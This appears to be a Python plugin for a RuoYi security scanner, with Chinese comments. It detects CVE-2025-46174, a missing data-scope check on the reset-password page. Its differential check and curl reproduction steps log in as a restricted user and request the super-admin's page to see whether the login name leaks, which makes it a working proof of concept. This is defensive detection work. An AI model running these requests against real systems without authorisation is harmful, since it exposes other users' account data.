# -*- coding: utf-8 -*-
"""CVE-2025-46174：RuoYi 重置密码页数据权限绕过（GET /system/user/resetPwd/{userId}）

漏洞
====
RuoYi 4.8.0 及更早版本的 `SysUserController.resetPwd(userId)`（GET，进入重置密码页）
只做了 `selectUserById(userId)`，**缺少 `checkUserDataScope(userId)` 数据权限校验**：

    漏洞版（<=4.8.0）：
        @GetMapping("/resetPwd/{userId}")
        public String resetPwd(@PathVariable("userId") Long userId, ModelMap mmap) {
            mmap.put("user", userService.selectUserById(userId));   // 无数据范围校验
            return prefix + "/resetPwd";
        }

    修复版（>=4.8.2，官方 commit ea4af7a8「进入重置密码页校验数据权限」）：
        @GetMapping("/resetPwd/{userId}")
        public String resetPwd(@PathVariable("userId") Long userId, ModelMap mmap) {
            userService.checkUserDataScope(userId);                 // ← 新增
            mmap.put("user", userService.selectUserById(userId));
            return prefix + "/resetPwd";
        }

影响：持有 `system:user:resetPwd` 功能权限、但数据范围受限的普通用户，
可越权读取本不该可见的用户信息（登录名、部门、手机号等随页面渲染）。属于越权信息泄露。

关于权限等级（与 NVD 标注不一致，以实测为准）
==============================================
NVD 给出的 CVSS 向量为 `PR:N`（无需权限）。但实测结论是**需要低权限账号**：
该接口带 `@RequiresPermissions("system:user:resetPwd")`，且 `checkUserDataScope`
对超管直接跳过（`if (!SysUser.isAdmin(...))`），因此：
  - 未认证 → 被 Shiro 拦截；
  - 超管 → 有无校验行为一致，**区分不出来**；
  - 只有「持有该功能权限 + 数据范围受限」的普通账号才能复现。
本插件按实测结论标注 `PR:L`，并在缺少低权账号时判 UNKNOWN 而不是假装有结论。

判定方式（差分）
================
不做单次响应的关键词匹配，而是「同一会话内对照组 + 实验组」：

  1. 先用低权账号 `POST /system/user/list` 取**可见用户集合**（受数据范围过滤）；
  2. **对照组**：请求一个可见用户的 resetPwd 页 → 必须正常渲染（证明会话/权限链路可用）；
  3. **实验组**：请求一个**不可见**用户的 resetPwd 页（默认超管 userId=1）；
  4. 判定：
     - 实验组也渲染出页面（含 `id="form-user-resetPwd"` 且 loginName 有值）→ **CONFIRMED**；
     - 实验组被拒（响应含 `没有权限访问用户数据`）→ **SAFE**；
     - 对照组都不渲染、或目标用户在可见集合内 → **UNKNOWN**（无法建立基线）。

注意修复版返回的是 **HTTP 200 + 错误页**（RuoYi 把 500 渲染成 200），
所以**状态码不能作为判据**，必须比对响应内容结构。
"""

import re

from common.logger import get_logger
from common.models import STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN, ScanResult
from config import settings
from core.auth_chain import LOGIN_CAPTCHA, isolated_auth_session
from core.http import join_url
from lib.colors import no, ok
from lib.reporter import emit
from plugins.base import PluginBase

logger = get_logger(__name__)

# 修复版 checkUserDataScope 抛出的 ServiceException 文本（服务端生成，非页面静态文案）
PERM_DENIED_MARKER = "没有权限访问用户数据"
# 重置密码页表单固定 id（已核实 4.7.8 / 4.8.0 / 4.8.2 / 4.8.3 四个版本模板一致）
FORM_MARKER = 'id="form-user-resetPwd"'
# 表单中渲染目标登录名的输入框
LOGIN_NAME_RE = re.compile(r'name="loginName"[^>]*value="([^"]*)"')


class Cve202546174ResetPwdScopePlugin(PluginBase):
    """重置密码页数据权限绕过检测（CVE-2025-46174）"""

    name = "重置密码页数据权限绕过"
    cve = "CVE-2025-46174"
    severity = "high"
    category = "vuln"
    description = "RuoYi <=4.8.0 的 GET /system/user/resetPwd/{userId} 缺少数据权限校验，普通用户可越权读取任意用户信息"
    # D2: 影响版本（实测边界：4.7.8/4.8.0 无校验，4.8.2/4.8.3 有）
    # D2: 影响版本
    # 注意：core/ruoyi_versions.version_in_range 的正则为 `(>=|<=|>|<)(\d+...)`，
    # **运算符与版本号之间不能有空格**——写成 "<= 4.8.0" 会被静默跳过并当成「全版本适用」。
    # 实测边界：4.7.8 / 4.8.0 无校验（可越权）；4.8.2 / 4.8.3 有校验（被拒）。
    # 4.8.1 未实测，按修复 commit（2025-04-16）落在 4.8.2 之前推断为受影响。
    affected_versions = ">=4.0,<=4.8.0"
    # D12: CVSS v3.1 —— 按实测标注 PR:L（NVD 标 PR:N，与接口实际权限要求不符）
    cvss_vector = "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"
    compliance = "等保2.0:8.1.3;OWASP:A01:2021"
    fix = "升级至 RuoYi 4.8.2+（官方 commit ea4af7a8 已在进入重置密码页时校验数据权限）"
    fix_detail = (
        "【升级方案】升级到 RuoYi 4.8.2 或更高版本\n"
        "【代码修复】在 SysUserController.resetPwd(GET) 中，selectUserById 之前补 userService.checkUserDataScope(userId);\n"
        "【配置加固】收窄普通角色的数据范围（sys_role.data_scope），仅授予必需部门\n"
        "【WAF 规则】对 /system/user/resetPwd/ 路径按 userId 参数做越权访问审计与告警\n"
        "【合规】等保2.0 8.1.3 访问控制"
    )

    reproduce = (
        "# 1. 用「持有 system:user:resetPwd 权限但数据范围受限」的普通账号登录，取会话\n"
        "curl -c c.txt -X POST 'http://target/login' -d 'username=lowpriv&password=***&validateCode=***'\n"
        "\n"
        "# 2. 带上会话访问不可见用户的重置密码页（示例 userId=1 为超管）\n"
        'curl -b c.txt -i "http://target/system/user/resetPwd/1"\n'
        "\n"
        "# 预期（漏洞版）：HTTP 200 且页面渲染出目标用户的登录名\n"
        "# 预期（修复版）：页面提示「没有权限访问用户数据」"
    )

    def verify(self, target, session):
        """在**独立会话**中登录后做差分验证

        为什么不用传入的共享 session：登录会改变会话的认证状态，且该状态会一直
        保留给后续插件（Shiro 把认证存在服务端 session，cookie 快照无法撤销）。
        而其余插件的判定普遍以「未认证基线」为前提，会被污染成误报
        （2026-09-17 实测：v4.8.3 因此多出 6 个假 CONFIRMED）。
        详见 core/auth_chain.isolated_auth_session 的说明。
        """
        with isolated_auth_session(
            target,
            settings.RuoYiLowPriv.USERNAME,
            settings.RuoYiLowPriv.PASSWORD,
            timeout=settings.RuoYiAuth.TIMEOUT,
        ) as (isolated, ok_login, reason):
            return self._verify_authed(target, isolated, ok_login, reason)

    def _verify_authed(self, target, session, ok_login, reason):
        """差分验证主体（session 为已登录的**隔离会话**）

        @param target: 目标站点根 URL
        @param session: 已登录的隔离会话（非共享会话）
        @param ok_login: 登录是否成功
        @param reason: 登录失败原因
        @return: ScanResult —— 实验组越权渲染为 CONFIRMED；被拒为 SAFE；无法建立基线为 UNKNOWN
        """
        if not ok_login:
            hint = "（该验证需要低权限账号，不是 admin）" if reason != LOGIN_CAPTCHA else ""
            emit(no(f"重置密码页数据权限绕过（登录失败：{reason}）{hint}"))
            return ScanResult(
                kind="info",
                name=self.name,
                status=STATUS_UNKNOWN,
                evidence=f"低权账号 {settings.RuoYiLowPriv.USERNAME} 登录失败：{reason}{hint}",
            )

        # Step 2：取当前账号可见的用户集合（受数据范围过滤）
        visible = self._visible_user_ids(target, session)
        if not visible:
            emit(no("重置密码页数据权限绕过（无法获取可见用户集合）"))
            return ScanResult(
                kind="info",
                name=self.name,
                status=STATUS_UNKNOWN,
                url=join_url(target, "/system/user/list"),
                evidence="登录成功但用户列表不可读，无法建立对照组基线，不予判定",
            )

        target_id = settings.RuoYiLowPriv.TARGET_USER_ID
        if target_id in visible:
            emit(no("重置密码页数据权限绕过（目标用户对当前账号可见，无法构成越权场景）"))
            return ScanResult(
                kind="info",
                name=self.name,
                status=STATUS_UNKNOWN,
                url=join_url(target, f"/system/user/resetPwd/{target_id}"),
                evidence=(
                    f"目标用户 userId={target_id} 出现在该账号可见集合 {sorted(visible)} 中，"
                    f"说明账号数据范围未被限制，构不成越权场景（请更换受限账号）"
                ),
            )

        # Step 3：对照组——可见用户的页面必须正常渲染，否则链路不可信
        control_id = sorted(visible)[0]
        control_body = self._fetch_reset_pwd(target, session, control_id)
        if not self._rendered_login_name(control_body):
            emit(no("重置密码页数据权限绕过（对照组未渲染，链路不可信）"))
            return ScanResult(
                kind="info",
                name=self.name,
                status=STATUS_UNKNOWN,
                url=join_url(target, f"/system/user/resetPwd/{control_id}"),
                evidence=(
                    f"对照组（可见用户 userId={control_id}）未渲染出重置密码页，无法证明会话与权限链路可用，不予判定"
                ),
            )

        # Step 4：实验组——不可见用户的页面
        test_url = join_url(target, f"/system/user/resetPwd/{target_id}")
        test_body = self._fetch_reset_pwd(target, session, target_id)
        leaked_login = self._rendered_login_name(test_body)

        # 4a：被拒（修复版行为）
        if PERM_DENIED_MARKER in test_body:
            emit(no("不存在重置密码页数据权限绕过"))
            return ScanResult(
                kind="info",
                name=self.name,
                status=STATUS_SAFE,
                url=test_url,
                evidence=(
                    f"以 {settings.RuoYiLowPriv.USERNAME}（可见用户 {sorted(visible)}）访问不可见用户 "
                    f"userId={target_id} 时被拒：「{PERM_DENIED_MARKER}」；"
                    f"对照组 userId={control_id} 正常渲染 ⇒ 数据权限校验生效"
                ),
            )

        # 4b：越权渲染（漏洞版行为）——渲染出不可见用户的登录名
        if leaked_login:
            emit(ok("存在重置密码页数据权限绕过（越权读取用户信息）"))
            return ScanResult(
                kind="vuln",
                name=self.name,
                severity=self.severity,
                status=STATUS_CONFIRMED,
                url=test_url,
                evidence=(
                    f"低权账号 {settings.RuoYiLowPriv.USERNAME}（可见用户 {sorted(visible)}）"
                    f"越权渲染出不可见用户 userId={target_id} 的重置密码页，"
                    f"泄露登录名「{leaked_login}」⇒ 缺少 checkUserDataScope 校验"
                ),
                fix=self.fix,
                extra={
                    "vuln_type": "auth",
                    "plugin_name": "cve_2025_46174_resetpwd_scope",
                    "cve": self.cve,
                    "leaked_user": leaked_login,
                },
            )

        # 4c：既没被拒也没渲染出数据（页面异常/空）→ 不轻易下结论
        emit(no("重置密码页数据权限绕过（响应既未拒绝也未渲染数据）"))
        return ScanResult(
            kind="info",
            name=self.name,
            status=STATUS_UNKNOWN,
            url=test_url,
            evidence=(f"实验组响应既无拒绝提示也无目标登录名渲染（长度 {len(test_body)}），形态不确定，不予判定"),
        )

    # ── 辅助 ────────────────────────────────────────────────────

    def _visible_user_ids(self, target, session):
        """取当前会话可见的 userId 集合（数据范围过滤后的结果）"""
        try:
            resp = session.post(join_url(target, "/system/user/list"), data={"pageNum": 1, "pageSize": 100})
            ct = (resp.headers.get("Content-Type") or "").lower()
            if "application/json" not in ct:
                return set()
            body = resp.json()
            rows = body.get("rows") or [] if isinstance(body, dict) else []
            return {int(r["userId"]) for r in rows if str(r.get("userId", "")).isdigit()}
        except Exception:
            logger.debug("获取可见用户集合失败", exc_info=True)
            return set()

    def _fetch_reset_pwd(self, target, session, user_id: int) -> str:
        """请求指定用户的重置密码页，返回响应体（失败返回空串）"""
        try:
            resp = session.get(join_url(target, f"/system/user/resetPwd/{user_id}"))
            return resp.text or ""
        except Exception:
            logger.debug("请求 resetPwd 页失败（userId=%s）", user_id, exc_info=True)
            return ""

    @staticmethod
    def _rendered_login_name(body: str) -> str:
        """若响应是渲染成功的重置密码页，返回其中渲染出的登录名；否则空串

        双重条件，避免把「错误页里恰好出现的字样」当成渲染成功：
          1. 存在表单标记 FORM_MARKER；
          2. loginName 输入框确实带有非空 value。
        """
        if FORM_MARKER not in (body or ""):
            return ""
        m = LOGIN_NAME_RE.search(body)
        return (m.group(1) or "").strip() if m else ""
